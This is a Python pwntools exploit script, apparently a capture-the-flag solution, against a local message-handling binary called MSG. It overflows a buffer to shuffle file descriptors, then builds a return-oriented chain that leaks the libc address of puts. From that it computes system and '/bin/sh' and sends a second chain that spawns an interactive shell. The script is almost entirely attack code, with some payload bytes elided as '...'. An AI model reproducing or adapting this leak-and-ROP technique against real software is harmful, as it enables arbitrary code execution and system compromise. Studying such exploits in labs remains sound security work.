from pwn import *

p = process("./MSG")
p.recv()
p.sendline("1")
p.recv()
p.sendline("a"*252+p32(0x00000002))
# open 3, close stderr(2)

p.recv()
p.sendline("1")
p.recvuntil("Msg ID : ")
msgId = p.recvline()
p.recv()
p.sendline("a"*252+p32(0x00000004))
# open 2, close 4


# ----- For offset ----- #
p.recv()
p.sendline("3")
p.recvuntil("Input msg ID :")
p.sendline("/"*86)

p.recv()
p.sendline("3")
p.recvuntil("Input msg ID :")
p.sendline("/"*80)

p.recv()
p.sendline("3")
p.recvuntil('Input msg ID : ')
# --------------------- #

# ROP
main = 0x08048D74
pr = 0x80485ad
puts_plt = 0x8048630
puts_got = 0x804b028
payload = "..."
payload += p32(puts_plt)
payload += p32(pr)
payload += p32(puts_got)
payload += p32(main)
p.sendline(payload)
p.recv()

p.sendline('3')
p.recvuntil("Input msg ID : ")
p.sendline(msgId)
p.recvuntil("\x0a\x0a")

puts = u32(p.recv(4))
base = puts - 0x0005fca0
system = base + 0x0003ada0
binsh = puts + 0xfbd0b
print "leaked puts : " + str(hex(puts))
print "base : " + str(hex(base))
print "system : " + str(hex(system))
print "/bin/sh : " + str(hex(binsh))
p.recv()
# ----- leaked ----- #



# ----- one more trial for exploit ----- #
p.sendline("1")
p.recv()
p.sendline("a"*252+p32(0x00000002))
# open 3, close stderr(2)

p.recv()
p.sendline("1")
p.recvuntil("Msg ID : ")
msgId = p.recvline()
p.recv()
p.sendline("a"*252+p32(0x00000004))
# open 2, close 4


# ----- For offset ----- #
p.recv()
p.sendline("3")
p.recvuntil("Input msg ID :")
p.sendline("/"*86)

p.recv()
p.sendline("3")
p.recvuntil("Input msg ID :")
p.sendline("/"*80)

p.recv()
p.sendline("3")
p.recvuntil('Input msg ID : ')
# --------------------- #

# ROP
payload = "..."
payload += p32(system)
payload += "aaaa"
payload += p32(binsh)
p.sendline(payload)
p.recv()

p.sendline('3')
p.recvuntil("Input msg ID : ")
p.sendline(msgId)
p.interactive()
# Exploit!  

